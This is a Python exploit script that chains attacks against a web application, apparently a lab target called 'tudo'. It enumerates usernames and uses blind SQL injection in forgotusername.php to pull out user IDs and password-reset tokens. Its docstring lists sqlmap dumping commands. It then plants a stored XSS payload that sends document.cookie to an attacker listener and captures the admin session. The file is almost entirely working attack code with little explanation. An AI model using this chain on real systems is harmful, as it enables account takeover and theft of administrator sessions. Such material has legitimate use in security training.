#!/usr/bin/python

import sys
import requests
import socket

# url = 'http://10.25.1.7:80'
# username_list_fp = '/home/kaliAdmin/ey-vapt/username_list.txt'
url = 'http://172.17.0.2:80' # local
username_list_fp = '/home/kali/labs/tudo/username_list.txt' # local

USER1_PASSWORD = 'password123'
LHOST = '192.168.26.130'
LPORT = '4444'

proxies = {
	'http': '127.0.0.1:8080',
	'https': '127.0.0.1:8080'
}


def enumerate_user(username_list_fp):
	valid_users = []

	with open(username_list_fp) as f:
		for username in f:
			data = {"username":username.strip()}
			r = requests.post(f"{url}/forgotusername.php", data=data, proxies=proxies, verify=False)
			if 'User exists' in r.text:
				valid_users.append(username.strip())

	return valid_users


def forgot_password(username):
	data = {"username":username}
	r = requests.post(f"{url}/forgotpassword.php", data=data, proxies=proxies, verify=False)
	if 'Email sent!' in r.text:
		return True
	return False



def get_uid(username):
	'''	
	SQLi PoC:
	- 	POST /forgotusername.php
		username=';select+pg_sleep(5);+--+
	
	1. save Burp POST /forgotusername.php (remove cookie) to sqli-psot-req.txt
	2. Enumerate DB schemas: 
		- sqlmap -r sqli-post-req.txt -p username --dbms=PostgreSQL --dbs
		- sqlmap -r sqli-post-req.txt -p username --dbms=PostgreSQL --tables
		- sqlmap -r sqli-post-req.txt -p username --dbms=PostgreSQL -T users --columns
		- sqlmap -r sqli-post-req.txt -p username --dbms=PostgreSQL -T tokens --columns

	tables in SQL:
	- create table users(uid int4, username text, password text, description text);
	- create table tokens(uid int4, tid int4, token text);
	'''
	uid = ''
	for i in range(50):
		injection_string = f"{username}' and (select uid from users where username='{username}')={str(i)};-- "
		data = {"username":injection_string}
		r = requests.post(f"{url}/forgotusername.php", data=data, proxies=proxies, verify=False)
		if 'User exists' in r.text:
			uid = str(i)
			break
	return uid


def get_reset_token(uid, username):
	# sqlmap -r sqli-post-req.txt -p username --dbms=PostgreSQL -T tokens --dump
	print(f"[+] getting reset token for {username}")
	token = ''

	for i in range(1,33):
		for j in range(32,127):
			template_string = f"(select ascii(substring(token,{i},1)) from tokens where uid={uid} limit 1)={j}"
			injection_string = f"{username}' and {template_string}; -- "

			data = {"username":injection_string}
		
			r = requests.post(url=f"{url}/forgotusername.php", data=data, verify=False)

			if 'User exists' in r.text:
				token += chr(j)
				sys.stdout.flush()
				sys.stdout.write(chr(j))
				sys.stdout.flush()
				break
	print('\n')
	return token
	

def reset_password(reset_token, password):
	data = {
		'token':reset_token,
		'password1':password,
		'password2':password
	}

	params = {"token":reset_token}
	r = requests.get(f"{url}/resetpassword.php", params=params, proxies=proxies, verify=False)
	r = requests.post(f"{url}/resetpassword.php", data=data, proxies=proxies, verify=False)
	if 'Password changed' in r.text:
		return True
	return False


def login(s, username, password):
	s.get(f"{url}/login.php")

	data = {'username':username,'password':password}
	r = s.post(f"{url}/login.php", data=data)
	if username in r.text:
		return True	


def update_profile_desc_for_stored_xss(s, payload):
	data = {"description":payload}
	r = s.post(f"{url}/profile.php", data=data)
	if "Success" in r.text:
		return True
	return False


def get_admin_cookie(lhost, lport):
	print(f"[+] setting up listener on port {lport}")
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.bind((lhost, 4444))
		s.listen()
		
		conn, addr = s.accept()
		data = conn.recv(4096)
		query_string = data.split(b" HTTP")[0][5:].decode()
		admin_cookie = query_string.split('=')[-1]
		s.close()
	return admin_cookie


def main():
	valid_users = enumerate_user(username_list_fp)
	for username in valid_users:
		print(f"[+] username found: {username}")

	username = valid_users[1] # user1 - low privilege

	# get user1 password
	print(f"[+] getting uid of username: {username}")
	uid = get_uid(username)
	print(f"[+] uid of username: {uid}")

	# # forgot password to generate reset token in DB
	# print(f"[+] sending forgot password for {username}")
	# if(forgot_password(username)):
	# 	print(f"[+] forgot password for {username} - success")
	# else:
	# 	print(f"[-] forgot password for {username} - fail, user doesn't exist")


	# # exfiltrate reset token via SQLi
	# print(f"[+] getting reset token for username: {username}")
	# reset_token = get_reset_token(uid, username)
	# print(f"[+] reset token for username: {reset_token}")

	# # reset password via token
	# print(f"[+] resetting forgot password for {username}")
	# if(reset_password(reset_token, USER1_PASSWORD)):
	# 	print(f"[+] reset password for {username} - success")
	# else:
	# 	print(f"[-] reset password for {username} - fail, token is invalid")

	# login
	s = requests.Session()
	s.proxies.update(proxies)
	s.verify = False

	# estab pre-auth sess
	r = s.get(f"{url}")

	print(f"[+] logging in with {username}:{USER1_PASSWORD}")
	if (login(s, username, USER1_PASSWORD)):
		print("[+] login success")
	else:
		print("[-] login failed")

	payload = f"<script>fetch('http://{LHOST}:{LPORT}/?c='+document.cookie);</script>"
	if (update_profile_desc_for_stored_xss(s, payload)):
		print(f"[+] updated {username} profile description to store: \n\t{payload}")
	else:
		print(f"[-] updated {username} profile description to store XSS payload - fail")

	admin_cookie = get_admin_cookie(LHOST, LPORT)
	print(admin_cookie)


if __name__ == "__main__":
	main()
